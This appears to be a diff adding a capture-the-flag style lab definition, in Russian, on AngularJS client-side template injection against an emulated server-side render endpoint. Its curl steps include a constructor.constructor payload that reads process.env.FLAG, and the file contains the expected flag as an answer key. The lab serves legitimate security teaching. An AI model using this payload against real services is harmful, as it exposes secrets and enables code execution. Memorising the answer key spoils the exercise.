@@ -1,0 +1,21 @@
+{
+  "id": "web-client-side-template-injection",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{cst1_4ngul4rjs_t3mpl4t3_t0_rce}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: CSTI на AngularJS\n\nSPA `crm.example` на AngularJS. Есть превью-эндпоинт, который рендерит\nвыражение шаблона на сервере (SSR):\n\n```\nhttps://crm.example/render?q=<выражение>\n```\n\n1. Обычный текст возвращается как есть:\n\n   curl -s 'https://crm.example/render?q=hello'\n\n2. Проверь, что `{{...}}` вычисляется (payload закодирован):\n\n   curl -s 'https://crm.example/render?q=%7B%7B7*7%7D%7D'\n\n3. Клиентский шаблон исполняется и на сервере — пробьёмся к `process`:\n\n   curl -s 'https://crm.example/render?q=%7B%7Bconstructor.constructor(%27return%20process.env.FLAG%27)()%7D%7D' > found.txt\n\n4. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция crm.example/render)",
+      "cases": [
+        { "match": "constructor", "example": "-s 'https://crm.example/render?q=%7B%7Bconstructor.constructor(%27return%20process.env.FLAG%27)()%7D%7D'", "output": "nto{cst1_4ngul4rjs_t3mpl4t3_t0_rce}\n" },
+        { "match": "7\\*7|7%2A7|%7B%7B7", "example": "-s 'https://crm.example/render?q=%7B%7B7*7%7D%7D'", "output": "49\n" },
+        { "match": "crm\\.example", "example": "-s 'https://crm.example/render?q=hello'", "output": "hello\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только https://crm.example/render?q=...\n"
+    }
+  }
+}
